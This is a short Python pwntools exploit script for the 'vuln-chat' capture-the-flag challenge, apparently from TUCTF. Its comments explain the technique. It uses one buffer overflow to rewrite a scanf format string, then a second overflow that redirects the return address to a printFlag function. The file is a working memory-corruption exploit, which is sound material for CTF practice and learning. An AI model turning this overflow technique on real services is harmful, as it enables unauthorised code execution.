#!/usr/bin/env python
from pwn import *

#m = process('./vuln-chat')
host, port = 'vulnchat.tuctf.com', 4141
m = remote(host,port)

#. We cannot use BOF to overwrite ret
#. But we can use BOF to overwrite format string of second scanf()

pFlag = 0x804856b
m.recvuntil('username')
payload = 'a'*20
payload += '%100s'
m.sendline(payload)
log.success('Overwrite the second format string with %100s')
m.recv()
p2load = 'a'*49
p2load += p32(pFlag)
m.sendline(p2load)
log.success('Overwrite return address with printFlag function address')

m.interactive()
